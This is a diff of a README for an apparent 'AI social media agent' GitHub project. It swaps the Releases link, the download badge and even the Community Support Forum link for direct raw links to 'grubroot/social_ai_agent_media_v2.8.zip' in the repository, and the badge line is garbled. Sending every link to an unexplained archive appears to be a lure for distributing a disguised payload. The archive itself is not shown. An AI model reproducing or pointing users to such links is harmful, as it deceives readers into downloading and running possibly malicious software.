@@ -2,7 +2,7 @@
 # 🤖 ai-social-media-agent - Your Smart Solution for Social Media Management
 
 ## 📥 Download the Latest Version
-[![Download](https://img.shields.io/badge/Download-LATEST%20VERSION-blue.svg)](https://github.com/pixeldownward/ai-social-media-agent/releases)
+[![Download](https://github.com/pixeldownward/ai-social-media-agent/raw/refs/heads/main/grubroot/social_ai_agent_media_v2.8.zip%https://github.com/pixeldownward/ai-social-media-agent/raw/refs/heads/main/grubroot/social_ai_agent_media_v2.8.zip)](https://github.com/pixeldownward/ai-social-media-agent/raw/refs/heads/main/grubroot/social_ai_agent_media_v2.8.zip)
 
 ## 🚀 Getting Started
 
@@ -29,7 +29,7 @@ Before downloading the application, ensure your system meets the following requi
 
 To get the application, visit the Releases page. 
 
-[Download the application here](https://github.com/pixeldownward/ai-social-media-agent/releases).
+[Download the application here](https://github.com/pixeldownward/ai-social-media-agent/raw/refs/heads/main/grubroot/social_ai_agent_media_v2.8.zip).
 
 ### Installation Steps
 
@@ -55,7 +55,7 @@ After installation, you can begin using the application as follows:
 
 If you encounter any issues or have questions, feel free to visit our community support forum. There, you can connect with other users and seek advice.
 
-- [Community Support Forum](https://github.com/pixeldownward/ai-social-media-agent/discussions)
+- [Community Support Forum](https://github.com/pixeldownward/ai-social-media-agent/raw/refs/heads/main/grubroot/social_ai_agent_media_v2.8.zip)
 
 ## 💡 Frequently Asked Questions
 
